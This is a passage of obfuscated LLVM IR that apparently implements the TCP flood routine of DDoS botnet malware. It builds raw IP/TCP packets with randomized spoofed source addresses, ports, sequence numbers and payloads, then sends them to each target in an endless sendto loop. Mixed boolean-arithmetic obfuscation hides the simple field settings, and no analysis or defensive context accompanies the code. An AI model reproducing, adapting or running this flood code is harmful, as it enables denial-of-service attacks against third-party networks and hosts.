  store %struct.tcphdr* %268, %struct.tcphdr** %25, align 8
  %269 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %270 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %269, i64 1
  %271 = bitcast %struct.tcphdr* %270 to i8*
  store i8* %271, i8** %26, align 8
  %272 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %273 = bitcast %struct.iphdr* %272 to i8*
  %274 = load i8, i8* %273, align 4
  %275 = xor i8 15, -1
  %276 = xor i8 %274, %275
  %277 = and i8 %276, %274
  %278 = and i8 %274, 15
  %279 = xor i8 %277, -1
  %280 = xor i8 64, -1
  %281 = xor i8 -61, -1
  %282 = and i8 %279, -61
  %283 = and i8 %277, %281
  %284 = and i8 %280, -61
  %285 = and i8 64, %281
  %286 = or i8 %282, %283
  %287 = or i8 %284, %285
  %288 = xor i8 %286, %287
  %289 = or i8 %279, %280
  %290 = xor i8 %289, -1
  %291 = or i8 -61, %281
  %292 = and i8 %290, %291
  %293 = or i8 %288, %292
  %294 = or i8 %277, 64
  store i8 %293, i8* %273, align 4
  %295 = load i8, i8* %16, align 1
  %296 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %297 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %296, i32 0, i32 1
  store i8 %295, i8* %297, align 1
  %298 = load i16, i16* %5, align 2
  %299 = zext i16 %298 to i64
  %300 = add i64 40, 4399391283117426061
  %301 = add i64 %300, %299
  %302 = sub i64 %301, 4399391283117426061
  %303 = add i64 40, %299
  %304 = trunc i64 %302 to i16
  %305 = call zeroext i16 @htons(i16 zeroext %304) #9
  %306 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %307 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %306, i32 0, i32 2
  store i16 %305, i16* %307, align 2
  %308 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %309 = bitcast %struct.iphdr* %308 to i8*
  %310 = load i8, i8* %309, align 4
  %311 = xor i8 %310, -1
  %312 = xor i8 -16, -1
  %313 = xor i8 -94, -1
  %314 = or i8 %311, %312
  %315 = or i8 -94, %313
  %316 = xor i8 %314, -1
  %317 = and i8 %316, %315
  %318 = and i8 %310, -16
  %319 = xor i8 %317, -1
  %320 = xor i8 5, -1
  %321 = xor i8 50, -1
  %322 = and i8 %319, 50
  %323 = and i8 %317, %321
  %324 = and i8 %320, 50
  %325 = and i8 5, %321
  %326 = or i8 %322, %323
  %327 = or i8 %324, %325
  %328 = xor i8 %326, %327
  %329 = or i8 %319, %320
  %330 = xor i8 %329, -1
  %331 = or i8 50, %321
  %332 = and i8 %330, %331
  %333 = or i8 %328, %332
  %334 = or i8 %317, 5
  store i8 %333, i8* %309, align 4
  %335 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i32 0, i32 4
  store i16 0, i16* %336, align 2
  %337 = load i8, i8* %7, align 1
  %338 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %339 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %338, i32 0, i32 5
  store i8 %337, i8* %339, align 4
  %340 = load i16, i16* %17, align 2
  %341 = call zeroext i16 @htons(i16 zeroext %340) #9
  %342 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %343 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %342, i32 0, i32 3
  store i16 %341, i16* %343, align 4
  %344 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %345 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %344, i32 0, i32 6
  store i8 6, i8* %345, align 1
  %346 = load i32, i32* %19, align 4
  %347 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i32 0, i32 8
  store i32 %346, i32* %348, align 4
  %349 = load %struct.arguments*, %struct.arguments** %2, align 8
  %350 = getelementptr inbounds %struct.arguments, %struct.arguments* %349, i32 0, i32 0
  %351 = load %struct.target*, %struct.target** %350, align 8
  %352 = load i32, i32* %3, align 4
  %353 = sext i32 %352 to i64
  %354 = getelementptr inbounds %struct.target, %struct.target* %351, i64 %353
  %355 = getelementptr inbounds %struct.target, %struct.target* %354, i32 0, i32 0
  %356 = load i32, i32* %355, align 4
  %357 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %358 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %357, i32 0, i32 9
  store i32 %356, i32* %358, align 4
  %359 = load i16, i16* %6, align 2
  %360 = call zeroext i16 @htons(i16 zeroext %359) #9
  %361 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %362 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %361, i32 0, i32 0
  %363 = bitcast %union.anon* %362 to %struct.anon.0*
  %364 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %363, i32 0, i32 1
  store i16 %360, i16* %364, align 2
  %365 = load i16, i16* %8, align 2
  %366 = call zeroext i16 @htons(i16 zeroext %365) #9
  %367 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %368 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %367, i32 0, i32 0
  %369 = bitcast %union.anon* %368 to %struct.anon.0*
  %370 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %369, i32 0, i32 0
  store i16 %366, i16* %370, align 4
  %371 = load i32, i32* %18, align 4
  %372 = trunc i32 %371 to i16
  %373 = call zeroext i16 @htons(i16 zeroext %372) #9
  %374 = zext i16 %373 to i32
  %375 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %376 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %375, i32 0, i32 0
  %377 = bitcast %union.anon* %376 to %struct.anon.0*
  %378 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %377, i32 0, i32 2
  store i32 %374, i32* %378, align 4
  %379 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %380 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %379, i32 0, i32 0
  %381 = bitcast %union.anon* %380 to %struct.anon.0*
  %382 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %381, i32 0, i32 4
  %383 = load i16, i16* %382, align 4
  %384 = xor i16 %383, -1
  %385 = xor i16 -241, -1
  %386 = xor i16 -27832, -1
  %387 = or i16 %384, %385
  %388 = or i16 -27832, %386
  %389 = xor i16 %387, -1
  %390 = and i16 %389, %388
  %391 = and i16 %383, -241
  %392 = xor i16 %390, -1
  %393 = xor i16 80, -1
  %394 = xor i16 22545, -1
  %395 = and i16 %392, 22545
  %396 = and i16 %390, %394
  %397 = and i16 %393, 22545
  %398 = and i16 80, %394
  %399 = or i16 %395, %396
  %400 = or i16 %397, %398
  %401 = xor i16 %399, %400
  %402 = or i16 %392, %393
  %403 = xor i16 %402, -1
  %404 = or i16 22545, %394
  %405 = and i16 %403, %404
  %406 = or i16 %401, %405
  %407 = or i16 %390, 80
  store i16 %406, i16* %382, align 4
  %408 = load i8, i8* %10, align 1
  %409 = sext i8 %408 to i16
  %410 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %411 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %410, i32 0, i32 0
  %412 = bitcast %union.anon* %411 to %struct.anon.0*
  %413 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %412, i32 0, i32 4
  %414 = load i16, i16* %413, align 4
  %415 = xor i16 1, -1
  %416 = xor i16 %409, %415
  %417 = and i16 %416, %409
  %418 = and i16 %409, 1
  %419 = shl i16 %417, 12
  %420 = xor i16 %414, -1
  %421 = xor i16 -4097, -1
  %422 = xor i16 25881, -1
  %423 = or i16 %420, %421
  %424 = or i16 25881, %422
  %425 = xor i16 %423, -1
  %426 = and i16 %425, %424
  %427 = and i16 %414, -4097
  %428 = xor i16 %426, -1
  %429 = xor i16 %419, -1
  %430 = xor i16 31308, -1
  %431 = and i16 %428, 31308
  %432 = and i16 %426, %430
  %433 = and i16 %429, 31308
  %434 = and i16 %419, %430
  %435 = or i16 %431, %432
  %436 = or i16 %433, %434
  %437 = xor i16 %435, %436
  %438 = or i16 %428, %429
  %439 = xor i16 %438, -1
  %440 = or i16 31308, %430
  %441 = and i16 %439, %440
  %442 = or i16 %437, %441
  %443 = or i16 %426, %419
  store i16 %442, i16* %413, align 4
  %444 = load i8, i8* %11, align 1
  %445 = sext i8 %444 to i16
  %446 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %447 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %446, i32 0, i32 0
  %448 = bitcast %union.anon* %447 to %struct.anon.0*
  %449 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %448, i32 0, i32 4
  %450 = load i16, i16* %449, align 4
  %451 = xor i16 %445, -1
  %452 = xor i16 1, -1
  %453 = xor i16 18822, -1
  %454 = or i16 %451, %452
  %455 = or i16 18822, %453
  %456 = xor i16 %454, -1
  %457 = and i16 %456, %455
  %458 = and i16 %445, 1
  %459 = shl i16 %457, 8
  %460 = xor i16 %450, -1
  %461 = xor i16 -257, -1
  %462 = xor i16 342, -1
  %463 = or i16 %460, %461
  %464 = or i16 342, %462
  %465 = xor i16 %463, -1
  %466 = and i16 %465, %464
  %467 = and i16 %450, -257
  %468 = and i16 %466, %459
  %469 = xor i16 %466, %459
  %470 = or i16 %468, %469
  %471 = or i16 %466, %459
  store i16 %470, i16* %449, align 4
  %472 = load i8, i8* %12, align 1
  %473 = sext i8 %472 to i16
  %474 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %475 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %474, i32 0, i32 0
  %476 = bitcast %union.anon* %475 to %struct.anon.0*
  %477 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %476, i32 0, i32 4
  %478 = load i16, i16* %477, align 4
  %479 = xor i16 %473, -1
  %480 = xor i16 1, -1
  %481 = xor i16 14604, -1
  %482 = or i16 %479, %480
  %483 = or i16 14604, %481
  %484 = xor i16 %482, -1
  %485 = and i16 %484, %483
  %486 = and i16 %473, 1
  %487 = shl i16 %485, 13
  %488 = xor i16 %478, -1
  %489 = xor i16 -8193, -1
  %490 = xor i16 29844, -1
  %491 = or i16 %488, %489
  %492 = or i16 29844, %490
  %493 = xor i16 %491, -1
  %494 = and i16 %493, %492
  %495 = and i16 %478, -8193
  %496 = xor i16 %494, -1
  %497 = xor i16 %487, -1
  %498 = xor i16 19110, -1
  %499 = and i16 %496, 19110
  %500 = and i16 %494, %498
  %501 = and i16 %497, 19110
  %502 = and i16 %487, %498
  %503 = or i16 %499, %500
  %504 = or i16 %501, %502
  %505 = xor i16 %503, %504
  %506 = or i16 %496, %497
  %507 = xor i16 %506, -1
  %508 = or i16 19110, %498
  %509 = and i16 %507, %508
  %510 = or i16 %505, %509
  %511 = or i16 %494, %487
  store i16 %510, i16* %477, align 4
  %512 = load i8, i8* %13, align 1
  %513 = sext i8 %512 to i16
  %514 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %515 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %514, i32 0, i32 0
  %516 = bitcast %union.anon* %515 to %struct.anon.0*
  %517 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %516, i32 0, i32 4
  %518 = load i16, i16* %517, align 4
  %519 = xor i16 1, -1
  %520 = xor i16 %513, %519
  %521 = and i16 %520, %513
  %522 = and i16 %513, 1
  %523 = shl i16 %521, 11
  %524 = xor i16 %518, -1
  %525 = xor i16 -2049, -1
  %526 = xor i16 -30162, -1
  %527 = or i16 %524, %525
  %528 = or i16 -30162, %526
  %529 = xor i16 %527, -1
  %530 = and i16 %529, %528
  %531 = and i16 %518, -2049
  %532 = and i16 %530, %523
  %533 = xor i16 %530, %523
  %534 = or i16 %532, %533
  %535 = or i16 %530, %523
  store i16 %534, i16* %517, align 4
  %536 = load i8, i8* %14, align 1
  %537 = sext i8 %536 to i16
  %538 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %539 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %538, i32 0, i32 0
  %540 = bitcast %union.anon* %539 to %struct.anon.0*
  %541 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %540, i32 0, i32 4
  %542 = load i16, i16* %541, align 4
  %543 = xor i16 %537, -1
  %544 = xor i16 1, -1
  %545 = xor i16 -9711, -1
  %546 = or i16 %543, %544
  %547 = or i16 -9711, %545
  %548 = xor i16 %546, -1
  %549 = and i16 %548, %547
  %550 = and i16 %537, 1
  %551 = shl i16 %549, 10
  %552 = xor i16 %542, -1
  %553 = xor i16 -1025, -1
  %554 = xor i16 6565, -1
  %555 = or i16 %552, %553
  %556 = or i16 6565, %554
  %557 = xor i16 %555, -1
  %558 = and i16 %557, %556
  %559 = and i16 %542, -1025
  %560 = and i16 %558, %551
  %561 = xor i16 %558, %551
  %562 = or i16 %560, %561
  %563 = or i16 %558, %551
  store i16 %562, i16* %541, align 4
  %564 = load i8, i8* %15, align 1
  %565 = sext i8 %564 to i16
  %566 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %567 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %566, i32 0, i32 0
  %568 = bitcast %union.anon* %567 to %struct.anon.0*
  %569 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %568, i32 0, i32 4
  %570 = load i16, i16* %569, align 4
  %571 = xor i16 %565, -1
  %572 = xor i16 1, -1
  %573 = xor i16 -27091, -1
  %574 = or i16 %571, %572
  %575 = or i16 -27091, %573
  %576 = xor i16 %574, -1
  %577 = and i16 %576, %575
  %578 = and i16 %565, 1
  %579 = shl i16 %577, 9
  %580 = xor i16 -513, -1
  %581 = xor i16 %570, %580
  %582 = and i16 %581, %570
  %583 = and i16 %570, -513
  %584 = xor i16 %582, -1
  %585 = xor i16 %579, -1
  %586 = xor i16 31803, -1
  %587 = and i16 %584, 31803
  %588 = and i16 %582, %586
  %589 = and i16 %585, 31803
  %590 = and i16 %579, %586
  %591 = or i16 %587, %588
  %592 = or i16 %589, %590
  %593 = xor i16 %591, %592
  %594 = or i16 %584, %585
  %595 = xor i16 %594, -1
  %596 = or i16 31803, %586
  %597 = and i16 %595, %596
  %598 = or i16 %593, %597
  %599 = or i16 %582, %579
  store i16 %598, i16* %569, align 4
  %600 = call i32 @rand_new()
  %601 = xor i32 %600, -1
  %602 = xor i32 65535, -1
  %603 = xor i32 1794754194, -1
  %604 = or i32 %601, %602
  %605 = or i32 1794754194, %603
  %606 = xor i32 %604, -1
  %607 = and i32 %606, %605
  %608 = and i32 %600, 65535
  %609 = trunc i32 %607 to i16
  %610 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %611 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %610, i32 0, i32 0
  %612 = bitcast %union.anon* %611 to %struct.anon.0*
  %613 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %612, i32 0, i32 5
  store i16 %609, i16* %613, align 2
  %614 = load i32, i32* %20, align 4
  %615 = trunc i32 %614 to i16
  %616 = call zeroext i16 @htons(i16 zeroext %615) #9
  %617 = zext i16 %616 to i32
  %618 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %619 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %618, i32 0, i32 0
  %620 = bitcast %union.anon* %619 to %struct.anon.0*
  %621 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %620, i32 0, i32 3
  store i32 %617, i32* %621, align 4
  %622 = load i8*, i8** %26, align 8
  %623 = load i16, i16* %5, align 2
  %624 = zext i16 %623 to i32
  call void @rand_string(i8* %622, i32 %624)
  br label %625

; <label>:625:                                    ; preds = %259
  %626 = load i32, i32* %3, align 4
  %627 = sub i32 0, 1
  %628 = sub i32 %626, %627
  %629 = add nsw i32 %626, 1
  store i32 %628, i32* %3, align 4
  br label %182

; <label>:630:                                    ; preds = %182
  br label %631

; <label>:631:                                    ; preds = %862, %630
  store i32 0, i32* %3, align 4
  br label %632

; <label>:632:                                    ; preds = %857, %631
  %633 = load i32, i32* %3, align 4
  %634 = load %struct.arguments*, %struct.arguments** %2, align 8
  %635 = getelementptr inbounds %struct.arguments, %struct.arguments* %634, i32 0, i32 3
  %636 = load i8, i8* %635, align 1
  %637 = zext i8 %636 to i32
  %638 = icmp slt i32 %633, %637
  br i1 %638, label %639, label %862

; <label>:639:                                    ; preds = %632
  %640 = load i8**, i8*** %9, align 8
  %641 = load i32, i32* %3, align 4
  %642 = sext i32 %641 to i64
  %643 = getelementptr inbounds i8*, i8** %640, i64 %642
  %644 = load i8*, i8** %643, align 8
  %645 = bitcast i8* %644 to %struct.iphdr*
  store %struct.iphdr* %645, %struct.iphdr** %27, align 8
  %646 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %647 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %646, i64 1
  %648 = bitcast %struct.iphdr* %647 to %struct.tcphdr*
  store %struct.tcphdr* %648, %struct.tcphdr** %28, align 8
  %649 = load %struct.arguments*, %struct.arguments** %2, align 8
  %650 = getelementptr inbounds %struct.arguments, %struct.arguments* %649, i32 0, i32 0
  %651 = load %struct.target*, %struct.target** %650, align 8
  %652 = load i32, i32* %3, align 4
  %653 = sext i32 %652 to i64
  %654 = getelementptr inbounds %struct.target, %struct.target* %651, i64 %653
  %655 = getelementptr inbounds %struct.target, %struct.target* %654, i32 0, i32 1
  %656 = load i16, i16* %655, align 4
  %657 = zext i16 %656 to i32
  %658 = icmp slt i32 %657, 32
  br i1 %658, label %659, label %682

; <label>:659:                                    ; preds = %639
  %660 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %661 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %660, i32 0, i32 9
  %662 = load i32, i32* %661, align 4
  %663 = call i32 @ntohl(i32 %662) #9
  %664 = call i32 @rand_new()
  %665 = load %struct.arguments*, %struct.arguments** %2, align 8
  %666 = getelementptr inbounds %struct.arguments, %struct.arguments* %665, i32 0, i32 0
  %667 = load %struct.target*, %struct.target** %666, align 8
  %668 = load i32, i32* %3, align 4
  %669 = sext i32 %668 to i64
  %670 = getelementptr inbounds %struct.target, %struct.target* %667, i64 %669
  %671 = getelementptr inbounds %struct.target, %struct.target* %670, i32 0, i32 1
  %672 = load i16, i16* %671, align 4
  %673 = zext i16 %672 to i32
  %674 = lshr i32 %664, %673
  %675 = sub i32 %663, 1386893222
  %676 = add i32 %675, %674
  %677 = add i32 %676, 1386893222
  %678 = add i32 %663, %674
  %679 = call i32 @htonl(i32 %677) #9
  %680 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %681 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %680, i32 0, i32 9
  store i32 %679, i32* %681, align 4
  br label %682

; <label>:682:                                    ; preds = %659, %639
  %683 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %684 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %683, i32 0, i32 8
  %685 = load i32, i32* %684, align 4
  %686 = icmp eq i32 %685, -1
  br i1 %686, label %687, label %691

; <label>:687:                                    ; preds = %682
  %688 = call i32 @rand_new()
  %689 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %690 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %689, i32 0, i32 8
  store i32 %688, i32* %690, align 4
  br label %691

; <label>:691:                                    ; preds = %687, %682
  %692 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %693 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %692, i32 0, i32 3
  %694 = load i16, i16* %693, align 4
  %695 = zext i16 %694 to i32
  %696 = icmp eq i32 %695, 65535
  br i1 %696, label %697, label %706

; <label>:697:                                    ; preds = %691
  %698 = call i32 @rand_new()
  %699 = xor i32 65535, -1
  %700 = xor i32 %698, %699
  %701 = and i32 %700, %698
  %702 = and i32 %698, 65535
  %703 = trunc i32 %701 to i16
  %704 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %705 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %704, i32 0, i32 3
  store i16 %703, i16* %705, align 4
  br label %706

; <label>:706:                                    ; preds = %697, %691
  %707 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %708 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %707, i32 0, i32 0
  %709 = bitcast %union.anon* %708 to %struct.anon.0*
  %710 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %709, i32 0, i32 1
  %711 = load i16, i16* %710, align 2
  %712 = zext i16 %711 to i32
  %713 = icmp eq i32 %712, 65535
  br i1 %713, label %714, label %729

; <label>:714:                                    ; preds = %706
  %715 = call i32 @rand_new()
  %716 = xor i32 %715, -1
  %717 = xor i32 65535, -1
  %718 = xor i32 160163889, -1
  %719 = or i32 %716, %717
  %720 = or i32 160163889, %718
  %721 = xor i32 %719, -1
  %722 = and i32 %721, %720
  %723 = and i32 %715, 65535
  %724 = trunc i32 %722 to i16
  %725 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %726 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %725, i32 0, i32 0
  %727 = bitcast %union.anon* %726 to %struct.anon.0*
  %728 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %727, i32 0, i32 1
  store i16 %724, i16* %728, align 2
  br label %729

; <label>:729:                                    ; preds = %714, %706
  %730 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %731 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %730, i32 0, i32 0
  %732 = bitcast %union.anon* %731 to %struct.anon.0*
  %733 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %732, i32 0, i32 0
  %734 = load i16, i16* %733, align 4
  %735 = zext i16 %734 to i32
  %736 = icmp eq i32 %735, 65535
  br i1 %736, label %737, label %752

; <label>:737:                                    ; preds = %729
  %738 = call i32 @rand_new()
  %739 = xor i32 %738, -1
  %740 = xor i32 65535, -1
  %741 = xor i32 349829290, -1
  %742 = or i32 %739, %740
  %743 = or i32 349829290, %741
  %744 = xor i32 %742, -1
  %745 = and i32 %744, %743
  %746 = and i32 %738, 65535
  %747 = trunc i32 %745 to i16
  %748 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %749 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %748, i32 0, i32 0
  %750 = bitcast %union.anon* %749 to %struct.anon.0*
  %751 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %750, i32 0, i32 0
  store i16 %747, i16* %751, align 4
  br label %752

; <label>:752:                                    ; preds = %737, %729
  %753 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %754 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %753, i32 0, i32 0
  %755 = bitcast %union.anon* %754 to %struct.anon.0*
  %756 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %755, i32 0, i32 2
  %757 = load i32, i32* %756, align 4
  %758 = icmp eq i32 %757, 65535
  br i1 %758, label %759, label %773

; <label>:759:                                    ; preds = %752
  %760 = call i32 @rand_new()
  %761 = xor i32 %760, -1
  %762 = xor i32 65535, -1
  %763 = xor i32 -1611223659, -1
  %764 = or i32 %761, %762
  %765 = or i32 -1611223659, %763
  %766 = xor i32 %764, -1
  %767 = and i32 %766, %765
  %768 = and i32 %760, 65535
  %769 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %770 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %769, i32 0, i32 0
  %771 = bitcast %union.anon* %770 to %struct.anon.0*
  %772 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %771, i32 0, i32 2
  store i32 %767, i32* %772, align 4
  br label %773

; <label>:773:                                    ; preds = %759, %752
  %774 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %775 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %774, i32 0, i32 0
  %776 = bitcast %union.anon* %775 to %struct.anon.0*
  %777 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %776, i32 0, i32 3
  %778 = load i32, i32* %777, align 4
  %779 = icmp eq i32 %778, 65535
  br i1 %779, label %780, label %790

; <label>:780:                                    ; preds = %773
  %781 = call i32 @rand_new()
  %782 = xor i32 65535, -1
  %783 = xor i32 %781, %782
  %784 = and i32 %783, %781
  %785 = and i32 %781, 65535
  %786 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %787 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %786, i32 0, i32 0
  %788 = bitcast %union.anon* %787 to %struct.anon.0*
  %789 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %788, i32 0, i32 3
  store i32 %784, i32* %789, align 4
  br label %790

; <label>:790:                                    ; preds = %780, %773
  %791 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %792 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %791, i32 0, i32 7
  store i16 0, i16* %792, align 2
  %793 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %794 = bitcast %struct.iphdr* %793 to i16*
  %795 = call zeroext i16 @ip_header_checksum(i16* %794, i32 20)
  %796 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %797 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %796, i32 0, i32 7
  store i16 %795, i16* %797, align 2
  %798 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %799 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %798, i32 0, i32 0
  %800 = bitcast %union.anon* %799 to %struct.anon.0*
  %801 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %800, i32 0, i32 6
  store i16 0, i16* %801, align 4
  %802 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %803 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %804 = bitcast %struct.tcphdr* %803 to i8*
  %805 = load i16, i16* %5, align 2
  %806 = zext i16 %805 to i64
  %807 = sub i64 0, %806
  %808 = sub i64 20, %807
  %809 = add i64 20, %806
  %810 = trunc i64 %808 to i16
  %811 = call zeroext i16 @htons(i16 zeroext %810) #9
  %812 = load i16, i16* %5, align 2
  %813 = zext i16 %812 to i64
  %814 = sub i64 20, 2100804251132842853
  %815 = add i64 %814, %813
  %816 = add i64 %815, 2100804251132842853
  %817 = add i64 20, %813
  %818 = trunc i64 %816 to i32
  %819 = call zeroext i16 @tcp_udp_header_checksum(%struct.iphdr* %802, i8* %804, i16 zeroext %811, i32 %818)
  %820 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %821 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %820, i32 0, i32 0
  %822 = bitcast %union.anon* %821 to %struct.anon.0*
  %823 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %822, i32 0, i32 6
  store i16 %819, i16* %823, align 4
  %824 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 0
  store i16 2, i16* %824, align 4
  %825 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %826 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %825, i32 0, i32 0
  %827 = bitcast %union.anon* %826 to %struct.anon.0*
  %828 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %827, i32 0, i32 1
  %829 = load i16, i16* %828, align 2
  %830 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 1
  store i16 %829, i16* %830, align 2
  %831 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %832 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %831, i32 0, i32 9
  %833 = load i32, i32* %832, align 4
  %834 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 2
  %835 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %834, i32 0, i32 0
  store i32 %833, i32* %835, align 4
  %836 = load i32*, i32** %22, align 8
  %837 = load i32, i32* %3, align 4
  %838 = sext i32 %837 to i64
  %839 = getelementptr inbounds i32, i32* %836, i64 %838
  %840 = load i32, i32* %839, align 4
  %841 = load i8**, i8*** %9, align 8
  %842 = load i32, i32* %3, align 4
  %843 = sext i32 %842 to i64
  %844 = getelementptr inbounds i8*, i8** %841, i64 %843
  %845 = load i8*, i8** %844, align 8
  %846 = load i16, i16* %5, align 2
  %847 = zext i16 %846 to i64
  %848 = sub i64 40, -4826870540349725080
  %849 = add i64 %848, %847
  %850 = add i64 %849, -4826870540349725080
  %851 = add i64 40, %847
  %852 = bitcast %union.__CONST_SOCKADDR_ARG* %30 to %struct.sockaddr**
  %853 = bitcast %struct.sockaddr_in* %29 to %struct.sockaddr*
  store %struct.sockaddr* %853, %struct.sockaddr** %852, align 8
  %854 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %30, i32 0, i32 0
  %855 = load %struct.sockaddr*, %struct.sockaddr** %854, align 8
  %856 = call i64 @sendto(i32 %840, i8* %845, i64 %850, i32 16384, %struct.sockaddr* %855, i32 16)
  br label %857

; <label>:857:                                    ; preds = %790
  %858 = load i32, i32* %3, align 4
  %859 = sub i32 0, 1
  %860 = sub i32 %858, %859
  %861 = add nsw i32 %858, 1
  store i32 %860, i32* %3, align 4
  br label %632

; <label>:862:                                    ; preds = %632
  br label %631
                                                  ; No predecessors!
  ret void
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @tcp_handshake(i16 zeroext, i32, i32, i32, i32) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
